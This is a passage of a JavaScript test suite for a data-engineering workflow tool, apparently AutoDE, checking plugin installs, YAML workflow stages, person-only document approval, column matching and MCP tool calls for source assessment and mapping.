      const g = await cli(['plugin', 'install', '--host', 'copilot', '--workspace', ws, '--json'], { env });
      assert.ok(nodeFs.existsSync(nodePath.join(ws, '.github', 'agents', 'documenter.agent.md')) && /\/mcp add/.test(g.json().mcp.instruction));
      assert.ok(/tools: \["read", "search", "autode\//.test(nodeFs.readFileSync(nodePath.join(ws, '.github', 'agents', 'documenter.agent.md'), 'utf8')));
      const k = await cli(['plugin', 'install', '--host', 'cortex', '--scope', 'user', '--workspace', ws, '--json'], { env });
      assert.ok(nodeFs.existsSync(nodePath.join(tmp, 'home', '.snowflake', 'cortex', 'skills', 'autode-core-orchestrator', 'SKILL.md')) && /mcp\.json/.test(k.json().mcp.instruction));
      const u = await cli(['plugin', 'install', '--host', 'claude', '--scope', 'user', '--workspace', ws, '--json'], { env });
      assert.ok(/claude mcp add --scope user autode/.test(u.json().mcp.instruction));
      assert.strictEqual((await cli(['plugin', 'install', '--host', 'emacs', '--workspace', ws])).code, 2);
    } finally { nodeFs.rmSync(tmp, { recursive: true, force: true }); }
  });

  await test('v0.45.0: the documenter replaces the architecture agent — plans can\'t name it, an old plan step that does fails with where it went, and the agents and skills ship everywhere the server does', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const hubSrc = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'agentHub.ts'), 'utf8');
    assert.ok(!/executeArchitectureAgent/.test(hubSrc) && !nodeFs.existsSync(nodePath.join(__dirname, '..', 'src', 'agents', 'validate', 'DocumentationAgent.ts')));
    assert.ok(!/architectureAgent/.test(hubSrc), 'v0.45.9: there is no plan of steps left to name it');
    const ignore = nodeFs.readFileSync(nodePath.join(__dirname, '..', '.vscodeignore'), 'utf8');
    assert.ok(ignore.includes('!agents/*.md') && ignore.includes('!skills/*/**'));
    assert.ok(require('../scripts/pack-cli.cjs').CONTENT.includes('agents'));
    const { SERVER_FILES } = fresh('../dist/core/mcpConfig.js');
    assert.ok(SERVER_FILES.includes('agents'));
  });

  // ---------- v0.45.1: the workflow is the only path ----------

  // A workspace template with a quality stage, a mapping and a model, each needing only the spec.
  const tinyFlow = async (ws, cliFn) => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const dir = nodePath.join(ws, '.autode', 'config', 'workflows');
    nodeFs.mkdirSync(dir, { recursive: true });
    const st = (id, kind, extra = '') => `  - id: ${id}\n    title: ${id}\n    kind: ${kind}\n    inclusion: default\n    consumes: [spec]\n    after: [plan (approved)]\n${extra}`;
    nodeFs.writeFileSync(nodePath.join(dir, 'tiny.yaml'), 'id: tiny\nversion: 1\ntitle: Tiny\ndescription: Three stages after the plan.\nstages:\n  - id: specify\n    title: Specification\n    kind: specify\n    inclusion: mandatory\n  - id: plan\n    title: Plan\n    kind: plan\n    inclusion: mandatory\n    after: [specify (approved)]\n' + st('quality', 'quality-rules') + st('mapping', 'mapping') + st('model', 'modelling') + st('build', 'build') + st('bi', 'bi-migration').replace('inclusion: default', 'inclusion: optional'));
    const W = ['--workspace', ws];
    const id = (await cliFn(['problems', 'new', 'Daily revenue from the shop orders', ...W, '--json'])).json().id;
    const prob = nodePath.join(ws, '.autode', 'problems', id);
    const spec = nodePath.join(prob, 'spec', 'business-problem.yaml');
    nodeFs.writeFileSync(spec, nodeFs.readFileSync(spec, 'utf8').replace('status: draft', 'status: approved').replace('problemStatementApproved: false', 'problemStatementApproved: true'));
    assert.strictEqual((await cliFn(['workflow', 'plan', '--template', 'tiny', ...W])).code, 0);
    return { id, prob, W };
  };

  await test('v0.45.1: the proposed workflow is shown in full before it is approved — every stage, and why the left-out ones are out', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-prop-'));
    try {
      const { id } = await tinyFlow(ws, cli);
      const m = fresh('../dist/core/workflowViewModel.js').buildWorkflowModel({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id });
      assert.ok(m.proposal && m.proposal.template === 'tiny v1', JSON.stringify(m.proposal));
      const bi = m.proposal.stages.find((s) => s.id === 'bi');
      assert.deepStrictEqual([bi.included, bi.inclusion], [false, 'optional'], 'shown as left out (the page says "optional, not included" when there is no reason)');
      assert.ok(m.proposal.stages.find((s) => s.id === 'mapping').included);
      assert.ok(m.stages.every((s) => s.guide), 'every stage says what moves it forward');
      const page = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'media', 'workflow.html'), 'utf8');
      assert.ok(page.includes('m.proposal') && page.includes('In the workflow'));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.1: a stage\'s document is approved from the view or the CLI — refused while it can\'t be (no mappings, another spec version), then the stage is done, recorded as the person', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-docapp-'));
    try {
      const { id, prob, W } = await tinyFlow(ws, cli);
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      const V = fresh('../dist/core/workflowViewModel.js');
      const D = fresh('../dist/engine/documents/problemDocuments.js');
      const A = fresh('../dist/engine/workflows/documentApproval.js');
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id };
      const spec = D.parseBusinessProblemSpec(D.readProblemDocument(prob, 'spec'));
      // An empty mapping: awaiting approval, but it can't be approved yet, and the view says why.
      nodeFs.mkdirSync(nodePath.join(prob, 'context'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'mapping-context.yaml'), D.serializeMappingContext({ specId: spec.id, specVersion: spec.version, status: 'built', mappings: [] }));
      let st = V.buildWorkflowModel(scope).stages.find((s) => s.id === 'mapping');
      assert.deepStrictEqual([st.status, st.actions.includes('approve-document'), st.blockers.length > 0, /no entity mappings/.test(st.guide)], ['awaiting-approval', false, true, true], JSON.stringify(st));
      assert.ok(st.actions.includes('produce') && st.produceLabel === 'Add a mapping…' && st.document.endsWith('mapping-context.yaml'));
      assert.strictEqual((await cli(['workflow', 'approve', 'mapping', ...W], { interactive: true, answers: ['approve'] })).code, 1);
      D.writeMappingUpsert(prob, { id: 'm1', sourceEntityId: 'shop.orders', sourceFqn: 'shop.orders', targetName: 'fct_orders', columns: [{ sourceColumn: 'order_id', targetColumn: 'order_id' }] });
      st = V.buildWorkflowModel(scope).stages.find((s) => s.id === 'mapping');
      assert.ok(st.actions.includes('approve-document') && /Review the mapping/.test(st.guide), JSON.stringify(st));
      assert.strictEqual((await cli(['workflow', 'approve', 'mapping', ...W])).code, 4, 'a person, at a terminal');
      const ok = await cli(['workflow', 'approve', 'mapping', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] });
      assert.strictEqual(ok.code, 0, ok.out + ok.err);
      st = V.buildWorkflowModel(scope).stages.find((s) => s.id === 'mapping');
      assert.deepStrictEqual([st.status, st.approvedBy], ['done', 'priya']);
      const ev = fresh('../dist/engine/workflows/events.js').readEvents(prob, { stage: 'mapping' }).find((e) => e.type === 'approved' && e.channel === 'cli');
      assert.ok(ev && ev.actor.kind === 'person' && ev.actor.name === 'priya');
      // Agents never approve a document: no MCP tool does it.
      const client = await mcpSession(ws);
      try { assert.ok(!(await client.listTools()).tools.some((t) => /approve/.test(t.name))); } finally { await client.close(); }
      // A context built for another spec version is refused.
      nodeFs.writeFileSync(nodePath.join(prob, 'context', 'source-context.yaml'), `specId: ${spec.id}\nspecVersion: ${spec.version + 5}\nstatus: built\nsources: []\n`);
      assert.ok(/another version/.test(A.documentApprovalProblems(prob, 'source-assessment').join()));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.1: every stage has a way forward — quality rules by the quality engineer (even where the plan named another role), the build by AutoDE\'s not-yet-migrated agents for that stage only, its files recorded to it', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-legacy-'));
    try {
      const { id, prob, W } = await tinyFlow(ws, cli);
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id };
      const wf = fresh('../dist/engine/workflows/instance.js').readWorkflow(prob);
      assert.strictEqual(wf.stages.find((s) => s.id === 'quality').agent.role, 'quality-engineer');
      // A plan approved before v0.45.1 named source-assessor: the assignment falls back to a defined role the kind allows.
      wf.stages.find((s) => s.id === 'quality').agent.role = 'source-assessor';
      fresh('../dist/engine/workflows/instance.js').writeWorkflow(prob, wf);
      const a = fresh('../dist/engine/agents/assignment.js').assignmentFor(scope, 'quality', []).assignment;
      assert.deepStrictEqual([a.role, a.skills.map((k) => k.id)], ['quality-engineer', ['autode-de-quality-rules']]);
      const m = fresh('../dist/core/workflowViewModel.js').buildWorkflowModel(scope);
      const st = (x) => m.stages.find((s) => s.id === x);
      assert.deepStrictEqual([st('quality').runner, st('quality').actions.includes('run')], ['quality-engineer', true]);
      assert.deepStrictEqual([st('model').runner, st('build').runner], ['data-modeler', 'pipeline-engineer'], 'since v0.45.4 every stage with an agent has a role template');
      if (st('build').status === 'ready') assert.ok(!st('build').actions.includes('run') && st('build').blockers.some((b) => /no mappings/.test(b)), 'v0.45.8: no Run agent while there is nothing to build from');
      // A stage with no agent at all says so, and offers hand-in or skip.
      const bi = fresh('../dist/core/workflowViewModel.js').buildWorkflowModel(scope).stages.find((s) => s.id === 'bi');
      assert.ok(!bi || bi.status === 'skipped' || /hand in/.test(bi.guide));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.1: nothing runs outside the workflow — the panel\'s Plan and Execute and /plan and /execute go to the Workflow view; a stage run never re-plans the problem', () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const src = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'webviewProvider.ts'), 'utf8');
    // v0.45.9 (SIMP-3): the plan's messages are gone; /plan, /execute and the spec's next step open the Workflow view.
    assert.ok(!/case 'generatePlan'|case 'executePlan'|hub\.executePlan|hub\.generatePlan/.test(src));
    const html = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'media', 'sidebar.html'), 'utf8');
    assert.ok(/case '\/plan': case '\/execute': case '\/workflow': post\('openWorkflowView'\)/.test(html) && !/post\('(generatePlan|generatePlanFromSpec|executePlan|approvePlan|resetPlan|pausePlan)'/.test(html));
    const hub = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'agentHub.ts'), 'utf8');
    assert.ok(!/runStageSteps/.test(hub), 'v0.45.4: no per-stage legacy runs remain');
    const pkg = require('../package.json');
    for (const c of ['workflowRun', 'workflowApproveDocument', 'workflowProduce', 'workflowOpenDocument']) assert.ok(pkg.contributes.commands.some((x) => x.command === `autoDataEngineeringHub.${c}`), c);
  });

  // ---------- v0.45.2: PA3b step 2 — the source assessor and the mapper ----------

  await test('v0.45.2: autode_match_columns is deterministic evidence — same name, prefix, vocabulary, words in common, earlier approved mappings; types that don\'t convert lower the score; one-to-one', () => {
    const M = fresh('../dist/engine/agents/columnMatch.js');
    const { buildVocabulary } = fresh('../dist/engine/context/vocabulary.js');
    const vocab = buildVocabulary();
    const r = M.matchColumns(
      { table: 'shop.orders', columns: [{ name: 'ORDER_ID', type: 'NUMBER' }, { name: 'CUST_NO', type: 'VARCHAR' }, { name: 'ord_status', type: 'VARCHAR' }, { name: 'created_at', type: 'TIMESTAMP' }, { name: 'legacy_flag', type: 'CHAR(1)' }] },
      { table: 'fct_orders', columns: [{ name: 'order_id', type: 'INTEGER' }, { name: 'customer_number', type: 'STRING' }, { name: 'status', type: 'STRING' }, { name: 'created_at', type: 'NUMBER' }, { name: 'net_amount', type: 'NUMBER' }] },
      { vocab, precedents: [{ source: 'legacy_flag', target: 'net_amount', problemId: 'p0' }] });
    const by = Object.fromEntries(r.matches.map((m) => [m.sourceColumn, m]));
    assert.deepStrictEqual([by.ORDER_ID.targetColumn, by.ORDER_ID.score], ['order_id', 1]);
    assert.ok(by.CUST_NO.targetColumn === 'customer_number' && /vocabulary/.test(by.CUST_NO.reasons.join()), JSON.stringify(by.CUST_NO));
    assert.ok(by.ord_status.targetColumn === 'status' && /prefix/.test(by.ord_status.reasons.join()), JSON.stringify(by.ord_status));
    assert.ok(by.created_at.score < 1 && /don't convert/.test(by.created_at.reasons.join()), 'timestamp → number is flagged');
    assert.ok(!by.legacy_flag, 'a precedent alone (no name evidence) is not a match');
    assert.ok(r.unmatchedTarget.includes('net_amount'));
    assert.strictEqual(new Set(r.matches.map((m) => m.targetColumn)).size, r.matches.length, 'one-to-one');
    const again = M.scorePair({ name: 'cust_no' }, { name: 'customer_number' }, { vocab, precedents: [{ source: 'cust_no', target: 'customer_number', problemId: 'p0' }] });
    assert.ok(again.score > 0.8 && /mapped this way before \(p0\)/.test(again.reasons.join()));
  });

  // A workspace template: sources (source assessment), then mapping, plus a conformance stage; a DDL file for the estate.
  const sourceFlow = async (ws, cliFn) => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const dir = nodePath.join(ws, '.autode', 'config', 'workflows');
    nodeFs.mkdirSync(dir, { recursive: true });
    nodeFs.writeFileSync(nodePath.join(dir, 'src.yaml'), 'id: src\nversion: 1\ntitle: Sources and mapping\ndescription: Assess, then map.\nstages:\n  - id: specify\n    title: Specification\n    kind: specify\n    inclusion: mandatory\n  - id: plan\n    title: Plan\n    kind: plan\n    inclusion: mandatory\n    after: [specify (approved)]\n  - id: sources\n    title: Source assessment\n    kind: source-assessment\n    inclusion: mandatory\n    after: [plan (approved)]\n  - id: conformance\n    title: Conformance\n    kind: conformance\n    inclusion: default\n    consumes: [estate]\n    after: [sources]\n  - id: mapping\n    title: Mapping\n    kind: mapping\n    inclusion: mandatory\n    consumes: [source-context]\n    after: [sources (approved)]\n');
    nodeFs.writeFileSync(nodePath.join(ws, 'shop.sql'), 'CREATE TABLE shop.orders (\n  order_id INT NOT NULL,\n  cust_no VARCHAR(20),\n  ord_status VARCHAR(10),\n  amount NUMBER(12,2)\n);\n');
    const W = ['--workspace', ws];
    const id = (await cliFn(['problems', 'new', 'Daily revenue from the shop orders', ...W, '--json'])).json().id;
    const prob = nodePath.join(ws, '.autode', 'problems', id);
    const spec = nodePath.join(prob, 'spec', 'business-problem.yaml');
    nodeFs.writeFileSync(spec, nodeFs.readFileSync(spec, 'utf8').replace('status: draft', 'status: approved').replace('problemStatementApproved: false', 'problemStatementApproved: true'));
    assert.strictEqual((await cliFn(['workflow', 'plan', '--template', 'src', ...W])).code, 0);
    assert.strictEqual((await cliFn(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
    return { id, prob, W };
  };

  await test('v0.45.2: over MCP — the source assessor brings the estate in and drafts the source context; the mapper matches and drafts mappings; a person approves each document; the right skill per stage', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-srcmap-'));
    let client;
    try {
      const { id, prob, W } = await sourceFlow(ws, cli);
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      let n = await call('autode_workflow_next', {});
      assert.deepStrictEqual([n.next.stage.id, n.assignment.role, n.assignment.skills.map((k) => k.id), n.assignment.tier], ['sources', 'source-assessor', ['autode-de-source-assessment'], 'platform-read']);
      for (const t of ['autode_ingest_file', 'autode_ingest_metadata', 'autode_record_source_context', 'autode_execute_query']) assert.ok(n.assignment.engineTools.includes(t), t);
      const A = fresh('../dist/engine/agents/assignment.js');
      assert.deepStrictEqual(A.assignmentFor({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id }, 'conformance', []).assignment.skills.map((k) => k.id), ['autode-de-conformance'], 'the same role, the skill of its stage');
      assert.strictEqual((await call('autode_ingest_file', { path: 'shop.sql', system: 'shop' })).code, undefined);
      assert.strictEqual((await call('autode_record_source_context', { sources: [{ connectionId: 'shop', method: 'guessed' }] })).code, 'VALIDATION_FAILED');
      const sc = await call('autode_record_source_context', { sources: [{ connectionId: 'shop', method: 'file', sourceType: 'database', description: 'The web shop' }] });
      assert.deepStrictEqual([sc.status, sc.sources], ['built', 1], JSON.stringify(sc));
      let st = await call('autode_workflow_status', {});
      assert.strictEqual(st.stages.find((s) => s.id === 'sources').status, 'awaiting-approval');
      assert.ok(fresh('../dist/engine/workflows/events.js').readEvents(prob, { stage: 'sources' }).some((e) => e.type === 'recorded' && e.files[0].endsWith('source-context.yaml')));
      assert.strictEqual((await cli(['workflow', 'approve', 'sources', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      n = await call('autode_workflow_next', {});
      const next = n.next.stage.id === 'mapping' ? n : null;
      const mapAsg = A.assignmentFor({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id }, 'mapping', (await client.listTools()).tools).assignment;
      assert.deepStrictEqual([mapAsg.role, mapAsg.skills.map((k) => k.id)], ['sttm-mapper', ['autode-de-mapping']]);
      assert.ok(mapAsg.engineTools.includes('autode_match_columns') && mapAsg.engineTools.includes('autode_record_mapping') && !mapAsg.engineTools.includes('autode_execute_query'), 'propose tier: no platform reads');
      void next;
      const m = await call('autode_match_columns', { source: 'shop.orders', targetColumns: [{ name: 'order_id', type: 'INTEGER' }, { name: 'customer_number', type: 'STRING' }, { name: 'status', type: 'STRING' }] });
      assert.deepStrictEqual(m.matches.map((x) => `${x.sourceColumn}>${x.targetColumn}`).sort(), ['cust_no>customer_number', 'ord_status>status', 'order_id>order_id'], JSON.stringify(m));
      const bad = await call('autode_record_mapping', { mapping: { id: 'map-orders', sourceEntityId: 'shop.orders', targetName: 'fct_orders', columns: [{ sourceColumn: 'nope', targetColumn: 'order_id' }] } });
      assert.ok(bad.code === 'VALIDATION_FAILED' && /does not exist/.test(bad.message), JSON.stringify(bad));
      const ok = await call('autode_record_mapping', { mapping: { id: 'map-orders', sourceEntityId: 'shop.orders', sourceFqn: 'shop.orders', targetName: 'fct_orders', columns: m.matches.map((x) => ({ sourceColumn: x.sourceColumn, targetColumn: x.targetColumn })) } });
      assert.deepStrictEqual([ok.status, ok.mappings], ['built', 1], JSON.stringify(ok));
      const D = fresh('../dist/engine/documents/problemDocuments.js');
      const spec = D.parseBusinessProblemSpec(D.readProblemDocument(prob, 'spec'));
      const doc = D.parseMappingContext(D.readProblemDocument(prob, 'mappingContext'));
      assert.deepStrictEqual([doc.specId, doc.specVersion], [spec.id, spec.version], 'pinned to the current specification (it was empty before v0.45.2)');
      st = await call('autode_workflow_status', {});
      assert.strictEqual(st.stages.find((s) => s.id === 'mapping').status, 'awaiting-approval');
      const ap = await cli(['workflow', 'approve', 'mapping', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] });
      assert.strictEqual(ap.code, 0, ap.out + ap.err);
      // The next problem's matcher knows this mapping as a precedent.
      assert.ok(fresh('../dist/engine/agents/columnMatch.js').mappingPrecedents(ws).some((p) => p.source === 'cust_no' && p.target === 'customer_number' && p.problemId === id));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.2: Run agent on a document stage drafts its document and leaves it for a person to approve; the old agents are gone and a saved plan step naming them says where they went', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-srcrun-'));
    try {
      const { id, prob, W } = await sourceFlow(ws, cli);
      const { EngineClient } = fresh('../dist/core/engineClient.js');
      const { runStage, stageRunner } = fresh('../dist/core/agentExecutor.js');
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id };
      assert.strictEqual(stageRunner(scope, 'sources', 'source-assessment'), 'source-assessor');
      const host = {
        createEngine: (n) => new EngineClient({ workspaceRoot: ws, resourcesRoot: wfRes(), version: 't', log: () => {}, clientName: n }),
        activeProvider: () => 'copilot', log: () => {},
        runAgentWithTools: async (_p, opts) => {
          await opts.engineTools.call('autode_ingest_file', { path: 'shop.sql', system: 'shop' });
          await opts.engineTools.call('autode_record_source_context', { sources: [{ connectionId: 'shop', method: 'file' }] });
          return { text: 'One source system, from a DDL file.', audit: [], provider: 'copilot' };
        }
      };
      let r = await runStage(host, scope, 'sources');
      assert.ok(r.ok && /approve it/.test(r.message), r.message);
      const st = () => fresh('../dist/core/workflowViewModel.js').buildWorkflowModel(scope).stages.find((s) => s.id === 'sources');
      assert.ok(st().status === 'awaiting-approval' && st().actions.includes('approve-document') && st().actions.includes('run'), JSON.stringify(st().actions));
      r = await runStage(host, scope, 'sources');
      assert.ok(r.ok, 'a draft can be redone while it waits for approval');
      assert.strictEqual((await cli(['workflow', 'approve', 'sources', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      assert.strictEqual(st().status, 'done');
      for (const f of ['src/agents/discover/SourceAssessmentAgent.ts', 'src/agents/model/SttmMapperAgent.ts', 'src/spokes/sttmAgent.ts', 'src/spokes/ingestionAgent.ts']) assert.ok(!nodeFs.existsSync(nodePath.join(__dirname, '..', f)), f);
      const hub = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'agentHub.ts'), 'utf8');
      assert.ok(!/sttmAgent|executeSttmAgent|executeSourceAssessmentAgent/.test(hub));
      void prob;
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.8: Run agent refuses a stage that has nothing to work on, before calling the model, and says what to do; a document stage that recorded only notes is not reported as drafted; the business-context file is not a source system', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-ready-'));
    try {
      const { id, prob } = await sourceFlow(ws, cli);
      const { EngineClient } = fresh('../dist/core/engineClient.js');
      const { runStage } = fresh('../dist/core/agentExecutor.js');
      const R = fresh('../dist/engine/workflows/readiness.js');
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id };
      // The owner's sample: an estate graph with business terms and no tables.
      const graph = nodePath.join(ws, '.autode', 'local', 'derived', 'graph.json');
      nodeFs.mkdirSync(nodePath.dirname(graph), { recursive: true });
      nodeFs.writeFileSync(graph, JSON.stringify({ nodes: [{ id: 't1', type: 'business_term' }], edges: [] }));
      assert.strictEqual(R.estateTableCount(ws), 0);
      let called = 0;
      const host = (agent) => ({
        createEngine: (n) => new EngineClient({ workspaceRoot: ws, resourcesRoot: wfRes(), version: 't', log: () => {}, clientName: n }),
        activeProvider: () => 'copilot', log: () => {},
        runAgentWithTools: async (_p, opts) => { called++; return agent(opts); }
      });
      const mapping = await runStage(host(() => ({ text: '', audit: [], provider: 'copilot' })), scope, 'mapping');
      assert.ok(!mapping.ok && /no tables in the estate/.test(mapping.message) && /autode estate ingest/.test(mapping.message), mapping.message);
      assert.strictEqual(called, 0, 'the model is not called');
      assert.ok(R.stageReadiness({ workspaceRoot: ws, problemRoot: prob, kind: 'modelling' }).some((p) => /no mappings/.test(p)));
      // A document stage whose agent records notes but not the document is not "drafted".
      const notes = await runStage(host(async (opts) => {
        await opts.engineTools.call('autode_record_artifact', { stage: 'sources', path: 'notes.md', content: '# No sources found' });
        return { text: 'I found no sources.', audit: [], provider: 'copilot' };
      }), scope, 'sources');
      assert.ok(!notes.ok && /without drafting sources's document/.test(notes.message) && /context\/source-context\.yaml/.test(notes.message), notes.message);
      // The view shows the same before anyone clicks: no Run agent, and why.
      nodeFs.writeFileSync(graph, JSON.stringify({ nodes: [{ id: 'shop.orders', type: 'table' }], edges: [] }));
      assert.deepStrictEqual(R.stageReadiness({ workspaceRoot: ws, problemRoot: prob, kind: 'mapping' }), []);
      // The business-context file was registered as a source system by the re-keying of its terms (fixed); an estate that has it doesn't count it.
      nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'knowledge'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'knowledge', 'estate.yaml'), 'systems:\n  - id: business-context\n    name: business-context\n    role: source\n  - id: shop\n    name: shop\n    role: source\nbindings:\n  - file: business-context.yaml\n    system: business-context\n  - file: shop.sql\n    system: shop\n');
      assert.deepStrictEqual(fresh('../dist/engine/workflows/instance.js').sourceSystems(ws), ['shop']);
      const cfm = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'engine', 'context', 'contextFileManager.ts'), 'utf8');
      assert.ok(/origin\?\.extractor === 'business-context'[^\n]*UNASSIGNED_SYSTEM/.test(cfm), 'knowledge-file origins never create a system');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.9: SIMP-3 — the plan of steps is gone (hub, executor, panel, types); context gaps are in the stage assignment, the same over MCP and in Run agent, and nothing pauses on them', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const G = fresh('../dist/engine/agents/stageGaps.js');
    // Gaps from a pack: joins, keys, grain and structure, once each, and only for stages whose work rests on them.
    const rel = { needed: 'relationship', subject: ['b', 'a'], text: 'tickets ↔ orders', reason: 'absent', minTrust: 'confirmed' };
    const listed = G.stageGapsFrom([rel, { ...rel, subject: ['a', 'b'] }, { needed: 'decision', subject: ['x'], text: 'x', reason: 'absent', minTrust: 'documented' }], 'mapping');
    assert.deepStrictEqual(listed.map((g) => g.needed), ['relationship']);
    assert.ok(/How are they related/.test(listed[0].question));
    assert.deepStrictEqual(G.stageGapsFrom([rel], 'document'), []);
    assert.ok(/Don't infer joins, keys or grain/.test(G.renderStageGaps(listed)) && G.renderStageGaps([]) === '');
    // From the problem's specification and the estate: tickets per order has no known join.
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-gaps-'));
    const env = await c3.ledgerFor(c3.graph());
    try {
      const { id, prob } = await sourceFlow(ws, cli);
      const D = fresh('../dist/engine/documents/problemDocuments.js');
      const spec = D.parseBusinessProblemSpec(D.readProblemDocument(prob, 'spec'));
      D.writeBusinessProblemSpec(prob, { ...spec, problemStatement: 'Report the number of support tickets per order.' });
      const gaps = G.stageContextGaps(c3.sources(env.ledger, env.project()), { problemRoot: prob, kind: 'mapping', title: 'Mapping' });
      assert.ok(gaps.some((g) => g.needed === 'relationship'), JSON.stringify(gaps));
      // In the assignment: a field and a section of its text.
      const A = fresh('../dist/engine/agents/assignment.js');
      const a = A.assignmentFor({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id }, 'mapping', [], { gaps }).assignment;
      assert.ok(a.contextGaps.length === gaps.length && /## Context gaps/.test(a.text), a.text.slice(0, 400));
      assert.deepStrictEqual(A.assignmentFor({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id }, 'mapping', []).assignment.contextGaps, []);
    } finally { env.cleanup(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
    // Over MCP, autode_workflow_next carries them; Run agent takes them from autode_context_pack (same function).
    const wt = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'mcp', 'workflowTools.ts'), 'utf8');
    const ex = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'agentExecutor.ts'), 'utf8');
    assert.ok(/stageContextGaps\(sources/.test(wt) && /autode_get_context_pack/.test(ex) && /stageGapsFrom/.test(ex));
    // The plan of steps is gone.
    for (const f of ['src/context/PlanManager.ts', 'src/core/phaseInference.ts', 'src/spokes/snowflakeExecutor.ts', 'src/core/panelProvider.ts', 'media/panel.html']) assert.ok(!nodeFs.existsSync(nodePath.join(__dirname, '..', f)), f);
    const hub = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'agentHub.ts'), 'utf8');
    assert.ok(!/executePlan|generatePlan|PlanStep|inferPhases|setContextProvider/.test(hub));
    const types = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'engine', 'types.ts'), 'utf8');
    assert.ok(!/interface PlanState|interface PlanStep|interface PersistedPlan|interface InferredPhase/.test(types));
    const pkg = require('../package.json');
    assert.ok(!pkg.contributes.commands.some((c) => /generatePlan|executePlan|resetSession/.test(c.command)) && !pkg.contributes.views.autoDataEngineeringHubPanel && !(pkg.contributes.viewsContainers.panel));
  });

  await test('v0.45.10: SIMP-4 — the contexts reference the workspace: the target context picks a target connection (which decides the platform) and keeps the problem\'s decisions; the source context lists estate systems; defaults come from team facts, then the last approved target; the same over the panel\'s engine path, MCP and the CLI; target-environment.yaml is gone', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-simp4-'));
    let client;
    try {
      const { id, prob, W } = await sourceFlow(ws, cli);
      const C = fresh('../dist/engine/context/problemContexts.js');
      const S = fresh('../dist/engine/agents/sourceContextDraft.js');
      // No connection yet: the platform is asked for; a named connection that doesn't exist is refused.
      assert.deepStrictEqual(C.targetConnectionChoices(ws), []);
      assert.ok(/No target connection "snowflake:nope"/.test(C.targetChoiceErrors(ws, { connectionId: 'snowflake:nope', modelingApproach: 'dimensional', transformationTool: 'dbt', orchestrationTool: 'airflow', namingConvention: 'snake_case' }).join(' ')));
      assert.ok(C.targetChoiceErrors(ws, { modelingApproach: 'dimensional', transformationTool: 'dbt', orchestrationTool: 'airflow', namingConvention: 'snake_case' }).some((e) => /connectionId/.test(e)));
      // A team target connection.
      nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
